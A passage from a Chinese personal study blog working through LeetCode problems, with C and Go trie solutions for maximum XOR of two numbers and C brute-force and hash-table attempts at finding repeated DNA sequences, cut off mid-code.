个二进制位为 0；</p><p> 如果 ai 的第 k 个二进制位为 1，那么我们应当往表示 0 的子节点走，这样 1⊕0&#x3D;1，可以使得 x 的第 k 个二进制位为 1。如果不存在表示 0 的子节点，那么我们只能往表示 1 的子节点走，x 的第 k 个二进制位为 0。</p><p>当遍历完所有的 31 个二进制位后，我们也就得到了 ai 可以通过异或运算得到的最大 x。这样一来，如果我们枚举了所有的 ai，也就得到了最终的答案。</p><p>细节</p><p>由于字典树中的每个节点最多只有两个子节点，分别表示 0 和 1，因此本题中的字典树是一棵二叉树。在设计字典树的数据结构时，我们可以令左子节点 left表示 0，右子节点 right表示 1。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALPHABET_SIZE 2^32</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 首先构造Trie树，把N个数的二进制表示插入到Trie树中</span></span><br><span class="line"><span class="comment"> * 然后从高到低使用贪心算法，验证每一位是否存在两个前缀，使得这两个前缀异或的结果的该位为1</span></span><br><span class="line"><span class="comment"> * 最后把得到的最大值返回即可</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Trie tree</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span> &#123;</span></span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span>* <span class="title">child</span>[2];</span> <span class="comment">// 0 和 1 两个子节点</span></span><br><span class="line">&#125; TrieNode;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create new Trie node and init</span></span><br><span class="line">TrieNode* <span class="title function_">createTrieNode</span><span class="params">()</span> &#123;</span><br><span class="line">    TrieNode* node = (TrieNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(TrieNode));</span><br><span class="line">    <span class="keyword">if</span> (node) &#123;</span><br><span class="line">        node-&gt;child[<span class="number">0</span>] = <span class="literal">NULL</span>;</span><br><span class="line">        node-&gt;child[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Insert nums to Trie tree</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">insert</span><span class="params">(TrieNode* root, <span class="type">int</span> nums)</span> &#123;</span><br><span class="line">    <span class="comment">//struct TrieNode* root = createTrieNode();</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span>* <span class="title">node</span> =</span> root;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">31</span>;i&gt;=<span class="number">0</span>;i--) &#123;</span><br><span class="line">        <span class="type">int</span> index = (nums&gt;&gt;i)&amp;<span class="number">1</span>; <span class="comment">//取出第i位二进制数</span></span><br><span class="line">        <span class="keyword">if</span>(node-&gt;child[index] == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            node-&gt;child[index] = createTrieNode();<span class="comment">//例如child[0]=0; 或者child[1]=1;否则为NULL</span></span><br><span class="line">        &#125;</span><br><span class="line">        node = node-&gt;child[index];   <span class="comment">//移到下一位</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Find Max XOR   </span></span><br><span class="line"><span class="comment">//这是在求放进i个数字进字典树之后，当前所有树中异或值最大的值。</span></span><br><span class="line"><span class="comment">//时间复杂度减少的原因就是查找ai对应的最大异或值的时候不是每一个去求异或，而是直接通过二进制位来找</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">findMaxXOR</span><span class="params">(TrieNode* root,<span class="type">int</span> num)</span> &#123;</span><br><span class="line">    TrieNode* node = root;     <span class="comment">//此时的node是那个字典树，num就是我们的ai</span></span><br><span class="line">    <span class="type">int</span> maxXOR = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">31</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">    <span class="type">int</span> bit = (num &gt;&gt; i) &amp; <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> complement = <span class="number">1</span> - bit;</span><br><span class="line">    <span class="keyword">if</span> (node-&gt;child[complement]) &#123;</span><br><span class="line">            maxXOR |= (<span class="number">1</span> &lt;&lt; i);</span><br><span class="line">            node = node-&gt;child[complement];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            node = node-&gt;child[bit];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> maxXOR;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Find Maxnum uses Greedy Algorithm</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">findMaximumXOR</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize)</span>&#123;</span><br><span class="line">    TrieNode* root = createTrieNode();</span><br><span class="line">    <span class="type">int</span> maxXOR = <span class="number">0</span>, currentXOR = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; numsSize; i++) &#123;</span><br><span class="line">    insert(root,nums[i]);</span><br><span class="line">    currentXOR = findMaxXOR(root, nums[i]); <span class="comment">//找到ai和前面的数组合中的最大异或值，遍历完之后最大的就是整个组合中最大的。</span></span><br><span class="line">    maxXOR = (currentXOR &gt; maxXOR) ? currentXOR : maxXOR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> maxXOR;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> nums[] = &#123;<span class="number">3</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">25</span>,<span class="number">2</span>,<span class="number">8</span>&#125;;</span><br><span class="line">    <span class="type">int</span> numsSize = <span class="keyword">sizeof</span>(nums)/<span class="keyword">sizeof</span>(nums[<span class="number">0</span>]);</span><br><span class="line">    <span class="type">int</span> max =  findMaximumXOR(nums, numsSize);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, max);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Go"><a href="#Go" class="headerlink" title="Go"></a>Go</h5><h6 id="字典树-1"><a href="#字典树-1" class="headerlink" title="字典树"></a>字典树</h6><p>先抄一下leetcode官方题解</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 作者：力扣官方题解</span></span><br><span class="line"><span class="comment">* 链接：https://leetcode.cn/problems/maximum-xor-of-two-numbers-in-an-array/solutions/778291/shu-zu-zhong-liang-ge-shu-de-zui-da-yi-h-n9m9/</span></span><br><span class="line"><span class="comment">* 来源：力扣（LeetCode）</span></span><br><span class="line"><span class="comment">* 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> trie <span class="keyword">struct</span> &#123;</span><br><span class="line">left, right *trie</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t *trie)</span></span> add(num <span class="type">int</span>) &#123;</span><br><span class="line">cur := t</span><br><span class="line"><span class="keyword">for</span> i := highBit; i &gt;= <span class="number">0</span>; i-- &#123;</span><br><span class="line">bit := num &gt;&gt; i &amp; <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> bit == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">if</span> cur.left == <span class="literal">nil</span> &#123;</span><br><span class="line">cur.left = &amp;trie&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">cur = cur.left</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> cur.right == <span class="literal">nil</span> &#123;</span><br><span class="line">cur.right = &amp;trie&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">cur = cur.right</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t *trie)</span></span> check(num <span class="type">int</span>) (x <span class="type">int</span>) &#123;</span><br><span class="line">cur := t</span><br><span class="line"><span class="keyword">for</span> i := highBit; i &gt;= <span class="number">0</span>; i-- &#123;</span><br><span class="line">bit := num &gt;&gt; i &amp; <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> bit == <span class="number">0</span> &#123;</span><br><span class="line"><span class="comment">// a_i 的第 k 个二进制位为 0，应当往表示 1 的子节点 right 走</span></span><br><span class="line"><span class="keyword">if</span> cur.right != <span class="literal">nil</span> &#123;</span><br><span class="line">cur = cur.right</span><br><span class="line">x = x*<span class="number">2</span> + <span class="number">1</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">cur = cur.left</span><br><span class="line">x = x * <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// a_i 的第 k 个二进制位为 1，应当往表示 0 的子节点 left 走</span></span><br><span class="line"><span class="keyword">if</span> cur.left != <span class="literal">nil</span> &#123;</span><br><span class="line">cur = cur.left</span><br><span class="line">x = x*<span class="number">2</span> + <span class="number">1</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">cur = cur.right</span><br><span class="line">x = x * <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">findMaximumXOR</span><span class="params">(nums []<span class="type">int</span>)</span></span> (x <span class="type">int</span>) &#123;</span><br><span class="line">root := &amp;trie&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">1</span>; i &lt; <span class="built_in">len</span>(nums); i++ &#123;</span><br><span class="line"><span class="comment">// 将 nums[i-1] 放入字典树，此时 nums[0 .. i-1] 都在字典树中</span></span><br><span class="line">root.add(nums[i<span class="number">-1</span>])</span><br><span class="line"><span class="comment">// 将 nums[i] 看作 ai，找出最大的 x 更新答案</span></span><br><span class="line">x = max(x, root.check(nums[i]))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">max</span><span class="params">(a, b <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line"><span class="keyword">if</span> a &gt; b &#123;</span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h4 id="DAY4-187-重复的DNA序列"><a href="#DAY4-187-重复的DNA序列" class="headerlink" title="DAY4-187.重复的DNA序列"></a>DAY4-187.重复的DNA序列</h4><p><a href="https://leetcode.cn/problems/repeated-dna-sequences/">187. 重复的DNA序列</a></p><h6 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h6><p>&#x3D;&#x3D;中等&#x3D;&#x3D;</p><blockquote><p><strong>DNA序列</strong> 由一系列核苷酸组成，缩写为 <code>&#39;A&#39;</code>, <code>&#39;C&#39;</code>, <code>&#39;G&#39;</code> 和 <code>&#39;T&#39;</code>.。</p><ul><li>例如，<code>&quot;ACGAATTCCG&quot;</code> 是一个 <strong>DNA序列</strong> 。</li></ul><p>在研究 <strong>DNA</strong> 时，识别 DNA 中的重复序列非常有用。</p><p>给定一个表示 <strong>DNA序列</strong> 的字符串 <code>s</code> ，返回所有在 DNA 分子中出现不止一次的 <strong>长度为 <code>10</code></strong> 的序列(子字符串)。你可以按 <strong>任意顺序</strong> 返回答案。</p><p> <strong>示例 1：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;AAAAACCCCCAAAAACCCCCCAAAAAGGGTTT&quot;</span><br><span class="line">输出：[&quot;AAAAACCCCC&quot;,&quot;CCCCCAAAAA&quot;]</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;AAAAAAAAAAAAA&quot;</span><br><span class="line">输出：[&quot;AAAAAAAAAA&quot;]</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><code>0 &lt;= s.length &lt;= 105</code></li><li><code>s[i]``==``&#39;A&#39;</code>、<code>&#39;C&#39;</code>、<code>&#39;G&#39;</code> or <code>&#39;T&#39;</code></li></ul></blockquote><h6 id="考点-2"><a href="#考点-2" class="headerlink" title="考点"></a>考点</h6><ul><li>哈希表查找</li><li>数组查找</li></ul><h5 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h5><ul><li>创建数组<code>a[len-9][]</code>，存放长度为10的字串<ul><li>i&#x3D;0到i&#x3D;len-10</li><li><code>a[i][j]</code>&#x3D;<code>s[j]</code></li></ul></li><li>查找相同的串，<code>a[i][j]=a[k][j]</code>输出</li></ul><h5 id="C语言-2"><a href="#C语言-2" class="headerlink" title="C语言"></a>C语言</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>** <span class="title function_">findRepeatedDnaSequences</span><span class="params">(<span class="type">char</span>* s, <span class="type">int</span>* returnSize)</span> &#123;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">if</span>(len&gt;<span class="number">10</span>)&#123;</span><br><span class="line">        <span class="type">int</span> len1 = len<span class="number">-9</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="type">char</span> (*a)[<span class="number">11</span>] = <span class="built_in">malloc</span>(len1 * <span class="keyword">sizeof</span>(*a));</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;len1;i++)&#123;</span><br><span class="line">                <span class="built_in">strncpy</span>(a[i], s + i, <span class="number">10</span>);</span><br><span class="line">                a[i][<span class="number">10</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="type">int</span>* count = <span class="built_in">malloc</span>(len1 * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">            <span class="built_in">memset</span>(count, <span class="number">0</span>, len1 * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len1; i++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> j = i + <span class="number">1</span>; j &lt; len1; j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(a[i], a[j]) == <span class="number">0</span>) &#123;</span><br><span class="line">                        count[i]++;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">char</span>** result = <span class="built_in">malloc</span>(len1 * <span class="keyword">sizeof</span>(*result));</span><br><span class="line">            *returnSize = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len1; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (count[i] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                                <span class="type">int</span> duplicate = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; *returnSize; k++) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(result[k], a[i]) == <span class="number">0</span>) &#123;</span><br><span class="line">                            duplicate = <span class="number">1</span>;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (!duplicate) &#123;</span><br><span class="line">                        result[*returnSize] = <span class="built_in">malloc</span>(<span class="number">11</span>);  </span><br><span class="line">                        <span class="built_in">strcpy</span>(result[*returnSize], a[i]);</span><br><span class="line">                        (*returnSize)++;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="built_in">free</span>(a);</span><br><span class="line">        <span class="built_in">free</span>(count);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    *returnSize = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>问题：</p><ul><li>超时了</li><li>增加了<code>duplicate</code>是为了防止相同的内容输出多次</li><li>一开始的二维数组改成了动态内存创建数组，节省空间。</li><li>用字符串比较和赋值等函数：<code>strncpy</code>，<code>strcmp</code>更方便</li></ul><h6 id="hash表优化"><a href="#hash表优化" class="headerlink" title="hash表优化"></a>hash表优化</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HashSize 100001</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">char</span>* key;</span><br><span class="line">    <span class="type">int</span> value;</span><br><span class="line">    <span class="type">int</span> used;</span><br><span class="line">&#125; HashEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    HashEntry* data;</span><br><span class="line">    <span class="type">int</span> size;    <span class="comment">//hashbiao长度</span></span><br><span class="line">&#125; HashMap;</span><br><span class="line">HashMap* <span class="title function_">createHashMap</span><span class="params">(<span class="type">int</span> size)</span> &#123;</span><br><span class="line">    HashMap* <span class="built_in">map</span> = (HashMap*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(HashMap));</span><br><span class="line">    <span class="built_in">map</span>-&gt;data = (HashEntry*)<span class="built_in">calloc</span>(size, <span class="keyword">sizeof</span>(HashEntry));</span><br><span class="line">    <span class="built_in">map</span>-&gt;size = size;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">       <span class="built_in">map</span>-&gt;data[i].used = <span class="number">0</span>; <span class="comment">// 初始化为未使用</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">map</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">insert</span><span class="params">(HashMap* <span class="built_in">map</span>, <span class="type">char</span>* key, <span class="type">char</span>** result, <span class="type">int</span>* returnSize)</span> &#123;</span><br><span class="line">    <span class="type">int</span> hash = <span class="built_in">abs</span>(hashString(key)) % <span class="built_in">map</span>-&gt;size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">map</span>-&gt;data[hash].used&gt;=<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="built_in">map</span>-&gt;data[hash].key, key) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 找到重复的子序列，存入结果数组</span></span><br><span class="line">           <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;data[hash].used == <span class="number">1</span>) &#123;</span><br><span class="line">                result[*returnSize] = strdup(key);</span><br><span class="line">                (*returnSize)++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">map</span>-&gt;data[hash].used++;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        hash = <span class="built_in">abs</span>(hash + <span class="number">1</span>) % <span class="built_in">map</span>-&gt;size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 未找到重复的子序列，插入当前子序列</span></span><br><span class="line">    <span class="built_in">map</span>-&gt;data[hash].key = strdup(key);</span><br><span class="line">    <span class="built_in">map</span>-&gt;data[hash].used++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">hashString</span><span class="params">(<span class="type">char</span>* str)</span> &#123;</span><br><span class="line">    <span class="comment">// 一个简单的字符串哈希函数</span></span><br><span class="line">    <span class="type">int</span> hash = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (*str) &#123;</span><br><span class="line">        hash = (hash ) + *str;</span><br><span class="line">        str++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hash;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>** <span class="title function_">findRepeatedDnaSequences</span><span class="params">(<span class="type">char</span>* s, <span class="type">int</span>* returnSize)</span> &#123;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">if</span>(len&gt;<span class="number">10</span>)&#123;</span><br><span class="line">        HashMap* <span class="built_in">map</span> = createHashMap(HashSize);</span><br><span class="line">        <span class="type">char</span>** result = <span class="built_in">malloc</span>(len * <span class="keyword">sizeof</span>(*result));</span><br><span class="line">        *returnSize = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;len<span class="number">-9</span>;i++)&#123;</span><br><span class="line">               <span class="type">char</span> key[<span class="number">11</span>];</span><br><span class="line">               <span 